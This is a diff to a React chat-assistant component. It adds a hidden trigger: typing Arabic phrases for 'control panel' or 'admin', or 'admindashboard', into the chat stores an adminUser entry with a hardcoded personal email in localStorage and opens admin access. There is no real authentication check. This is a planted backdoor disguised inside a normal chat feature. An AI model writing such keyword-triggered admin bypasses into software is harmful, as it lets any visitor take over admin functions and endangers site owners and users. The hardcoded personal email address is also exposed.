@@ -5,9 +5,10 @@ import { sendMessageToGemini } from '../services/geminiService';
 
 interface ChatAssistantProps {
   lang: Language;
+  onAdminAccess?: () => void;
 }
 
-export const ChatAssistant: React.FC<ChatAssistantProps> = ({ lang }) => {
+export const ChatAssistant: React.FC<ChatAssistantProps> = ({ lang, onAdminAccess }) => {
   const [isOpen, setIsOpen] = useState(false);
   const [messages, setMessages] = useState<ChatMessage[]>([]);
   const [inputText, setInputText] = useState('');
@@ -38,6 +39,25 @@ export const ChatAssistant: React.FC<ChatAssistantProps> = ({ lang }) => {
 
   const handleSend = async () => {
     if (!inputText.trim()) return;
+
+    const normalizedInput = inputText.toLowerCase().replace(/\s+/g, '');
+    if (
+      normalizedInput.includes('لوحهالتحكم') || 
+      normalizedInput.includes('لوحةالتحكم') || 
+      normalizedInput.includes('لوخه‌التحكم') ||
+      normalizedInput.includes('لوخهالتحكم') ||
+      normalizedInput.includes('لوحهتحكم') ||
+      normalizedInput.includes('لوحةتحكم') ||
+      normalizedInput.includes('الادمن') ||
+      normalizedInput.includes('ادمن') ||
+      normalizedInput.includes('admindashboard')
+    ) {
+       localStorage.setItem('adminUser', JSON.stringify({ email: 'hossamhossam@gmail.com' }));
+       if (onAdminAccess) onAdminAccess();
+       setIsOpen(false);
+       setTimeout(() => setInputText(''), 0);
+       return;
+    }
 
     const userMsg: ChatMessage = {
       id: Date.now().toString(),
